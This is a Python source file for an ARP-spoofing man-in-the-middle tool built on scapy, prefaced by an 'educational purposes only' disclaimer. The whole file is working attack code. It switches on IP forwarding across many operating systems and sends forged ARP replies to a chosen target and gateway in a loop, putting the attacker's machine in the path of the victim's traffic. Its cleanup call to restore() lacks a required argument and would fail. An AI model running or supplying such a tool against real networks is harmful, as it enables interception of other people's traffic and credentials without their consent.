"""
DISCLAIMER:
This script is intended for **educational purposes** and **authorized security research** only.
By using this tool, you agree that you are solely responsible for any actions taken with it.

Unauthorized access, use on networks you do not own or have explicit permission to test,
or any form of malicious activity is **illegal** and **strictly prohibited**.

The author and contributors of this script **do not accept any responsibility or liability**
for misuse, damage, or legal consequences that may arise from its use.
"""

import os
import scapy.all as scapy
import sys
import time
import argparse
import subprocess
import platform


# ANSI color codes
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
RESET = "\033[0m"


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target",
                        help="Specify the IP address of the target machine.")
    parser.add_argument("-g", "--gateway", dest="gateway",
                        help="Specify the IP address of the gateway (typically your router).")
    parser.add_argument("-v", "--verbose", dest="verbose", action="store_true",
                        help="Use this to enable verbose mode.")
    args = parser.parse_args()

    if not args.target:
        parser.error(
            "[-] You need target IP address with gateway address to run the program. Use -t or --target to specify IP for target Machine.")
    elif not args.gateway:
        parser.error(
            "[-] You need gateway IP address with target address to run the program. User -g or --gateway to specify IP for gateway.")
    return args


def toggle_port_forwarding():
    system_platform = platform.system().lower()

    print(f"[+] Detected platform: {system_platform}")

    if system_platform == "windows":
        print("[!] Enabling port forwarding temporarily (Windows)...")
        try:
            subprocess.run(
                "netsh interface ipv4 set global forwarding=enabled", check=True, shell=True)
            print("[+] Port forwarding enabled. A reboot may be required.")
        except subprocess.CalledProcessError:
            print(
                "[-] Failed to enable port forwarding on Windows. Try running as Administrator.")

    elif system_platform == "linux":
        print("[!] Enabling port forwarding temporarily (Linux)...")
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
            print("[+] Port forwarding enabled.")
        except PermissionError:
            print("[-] Permission denied. Try running with sudo.")
        except Exception as e:
            print(f"[-] Failed to enable port forwarding: {e}")

    elif system_platform == "darwin":
        print("[!] Enabling port forwarding temporarily (macOS)...")
        try:
            subprocess.run(
                ["sysctl", "-w", "net.inet.ip.forwarding=1"], check=True)
            print("[+] Port forwarding enabled.")
        except subprocess.CalledProcessError:
            print("[-] Failed to enable port forwarding on macOS.")
        except Exception as e:
            print(f"[-] Error: {e}")

    elif system_platform == "freebsd":
        print("[!] Enabling port forwarding (FreeBSD)...")
        try:
            subprocess.run(["sysctl", "net.inet.ip.forwarding=1"], check=True)
            print("[+] Port forwarding enabled.")
        except Exception as e:
            print(f"[-] Error: {e}")

    elif system_platform == "openbsd":
        print(
            "[!] Please manually set 'net.inet.ip.forwarding=1' in /etc/sysctl.conf on OpenBSD.")

    elif system_platform == "netbsd":
        print("[!] Please manually configure forwarding in /etc/sysctl.conf on NetBSD.")

    elif system_platform == "sunos" or system_platform == "solaris":
        print("[!] Port forwarding setup on Solaris is not standardized. Please configure IP forwarding via routeadm and ndd.")
        print("Example: `routeadm -e ipv4-forwarding && routeadm -u`")

    elif system_platform == "aix":
        print("[!] IBM AIX detected. Port forwarding must be configured via the 'no' command manually.")

    elif system_platform == "cygwin":
        print("[!] Cygwin environment detected. Port forwarding should be configured using native Windows tools.")

    else:
        print(f"[-] Unsupported or unknown platform: {system_platform}")


def disable_port_forwarding():
    system_platform = platform.system().lower()

    if system_platform == "windows":
        print("[!] Disabling port forwarding (Windows)...")
        try:
            subprocess.run(
                "netsh interface ipv4 set global forwarding=disabled", check=True, shell=True)
            print("[+] Port forwarding disabled.")
        except subprocess.CalledProcessError:
            print(
                "[-] Failed to disable port forwarding on Windows. Try running as Administrator.")

    elif system_platform == "linux":
        print("[!] Disabling port forwarding (Linux)...")
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")
            print("[+] Port forwarding disabled.")
        except PermissionError:
            print("[-] Permission denied. Try running with sudo.")
        except Exception as e:
            print(f"[-] Failed to disable port forwarding: {e}")

    elif system_platform == "darwin":
        print("[!] Disabling port forwarding (macOS)...")
        try:
            subprocess.run(
                ["sysctl", "-w", "net.inet.ip.forwarding=0"], check=True)
            print("[+] Port forwarding disabled.")
        except subprocess.CalledProcessError:
            print("[-] Failed to disable port forwarding on macOS.")
        except Exception as e:
            print(f"[-] Error: {e}")

    elif system_platform == "freebsd":
        print("[!] Disabling port forwarding (FreeBSD)...")
        try:
            subprocess.run(["sysctl", "net.inet.ip.forwarding=0"], check=True)
            print("[+] Port forwarding disabled.")
        except Exception as e:
            print(f"[-] Error: {e}")

    elif system_platform == "openbsd":
        print(
            "[!] Please manually set 'net.inet.ip.forwarding=0' in /etc/sysctl.conf on OpenBSD.")

    elif system_platform == "netbsd":
        print(
            "[!] Please manually set 'net.inet.ip.forwarding=0' in /etc/sysctl.conf on NetBSD.")

    elif system_platform == "sunos" or system_platform == "solaris":
        print("[!] Solaris detected. Disable port forwarding via `routeadm -d ipv4-forwarding && routeadm -u`.")

    elif system_platform == "aix":
        print(
            "[!] IBM AIX detected. Use the 'no' command to manually disable port forwarding.")

    elif system_platform == "cygwin":
        print("[!] Cygwin environment detected. Port forwarding must be disabled using native Windows tools.")

    else:
        print(f"[-] Unsupported or unknown platform: {system_platform}")


def get_mac(ip):
    try:
        request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast/request
        answered = scapy.srp(packet, timeout=1, verbose=False)[0]

        return answered[0][1].hwsrc
    except Exception as e:
        print(f"[!] Error during Scan: {e}")
        sys.exit(1)


def spoof(target_ip, spoof_ip, verbose):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=verbose or False)


def restore(destination_ip, source_ip, verbose):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=verbose or False)


def print_info(target, gateway, verbose):
    print("-"*100)
    print(f"{CYAN}Target IP\t{GREEN}Gateway IP\t{RED}Spoofed{RESET}")
    print("-"*100)
    packet_sent = 0
    while True:
        spoof(target, gateway, verbose)
        spoof(gateway, target, verbose)
        packet_sent += 2
        print(f"\r{target}\t{gateway}\t{str(packet_sent)}", end="")
        time.sleep(2)


def validate_ip(ip):
    try:
        scapy.ARP(pdst=ip)
        return True
    except Exception:
        return False


def main():
    options = get_arguments()
    validate_ip(options.target)
    validate_ip(options.gateway)
    toggle_port_forwarding()
    try:
        print_info(options.target, options.gateway, options.verbose)
    except KeyboardInterrupt:
        print("[+] Detected Ctrl + C. Quitting...")
        restore(options.gateway, options.target)
        disable_port_forwarding()


if __name__ == "__main__":
    main()
